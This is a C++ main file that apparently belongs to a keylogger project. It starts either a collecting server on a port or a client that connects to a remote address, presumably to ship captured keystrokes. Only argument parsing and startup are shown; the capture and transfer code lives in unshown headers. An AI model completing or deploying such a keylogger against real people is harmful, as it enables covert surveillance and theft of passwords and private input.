#include "server.hpp"
#include "client.hpp"
#include "keylogger.hpp"
#include <iostream>
#include <string>
#include <cstdlib>

constexpr size_t BUFFER_LIMIT = 32;

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage:\n"
            << "  " << argv[0] << " server <port>\n"
            << "  " << argv[0] << " client <address> <port>\n";
        return 1;
    }

    std::string mode = argv[1];

    if (mode == "server") {
        if (argc < 3) {
            std::cerr << "Please provide port\n";
            return 1;
        }
        int port = std::stoi(argv[2]);
        Server server(port);
        if (!server.start()) {
            std::cerr << "Server failed to start\n";
            return 1;
        }
        pause();

    } else if (mode == "client") {
        if (argc < 4) {
            std::cerr << "Please provide address, port\n";
            return 1;
        }
        std::string address = argv[2];
        int port = std::stoi(argv[3]);
        Client client(address, port, BUFFER_LIMIT);
        if (!client.start()) {
            std::cerr << "Client error\n";
            return 1;
        }
        pause();

    } else {
        std::cerr << "Unknown mode: " << mode << std::endl;
        return 1;
    }

    return 0;
}
